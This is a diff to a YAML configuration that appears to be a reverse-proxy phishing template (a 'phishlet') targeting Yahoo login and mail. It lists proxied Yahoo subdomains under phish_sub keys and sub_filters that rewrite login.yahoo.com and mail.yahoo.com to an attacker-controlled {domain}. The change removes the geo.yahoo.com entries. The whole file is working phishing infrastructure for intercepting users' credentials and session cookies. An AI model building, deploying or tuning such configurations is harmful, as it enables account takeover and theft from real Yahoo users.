@@ -14,9 +14,6 @@ proxy_hosts:
   - {phish_sub: 'fc', orig_sub: 'fc', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'ads', orig_sub: 'ads', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
   - {phish_sub: 'csp', orig_sub: 'csp', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: false}
-  - {phish_sub: 'geo', orig_sub: 'geo', domain: 'yahoo.com', session: false, is_landing: false, auto_filter: true}
-  
-#geo.yahoo.com  
 sub_filters:
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'login.yahoo.com', replace: 'login.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'mail.yahoo.com', replace: 'mail.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
@@ -24,7 +21,6 @@ sub_filters:
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'udc.yahoo.com', replace: 'udc.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'fc.yahoo.com', replace: 'login.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'ads.yahoo.com', replace: 'login.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
-  - {triggers_on: 'login.yahoo.com', orig_sub: 'login', domain: 'yahoo.com', search: 'geo.yahoo.com', replace: 'geo.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'mail.yahoo.com', orig_sub: 'mail', domain: 'yahoo.com', search: 'csp.yahoo.com', replace: 'login.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'login.yahoo.com', replace: 'login.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
   - {triggers_on: 'guce.yahoo.com', orig_sub: 'guce', domain: 'yahoo.com', search: 'mail.yahoo.com', replace: 'mail.{domain}', mimes: ['text/html', 'text/javascript', 'application/javascript', 'application/json']}
